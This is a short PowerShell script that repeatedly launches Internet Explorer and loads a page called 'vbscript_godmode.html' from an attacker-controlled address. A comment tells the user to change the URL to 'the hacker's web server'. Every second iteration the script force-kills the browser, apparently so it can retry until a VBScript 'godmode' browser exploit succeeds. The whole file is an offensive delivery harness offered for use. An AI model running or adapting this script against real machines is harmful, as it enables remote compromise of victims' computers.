$Url ="http://192.168.0.112/vbscript_godmode.html"
#Change the URL to the hacker's web server 
$n=0
while(1)
     {
     	$n++
 		$ie=new-object -com internetexplorer.application
        $ie.navigate2($Url)
		$ie.visible=$true
        sleep 5
        $ie.Quit()
		$ie=0
		if ($n -like "2") {taskkill /F /IM iexplore.exe;$n=0 } 
     }
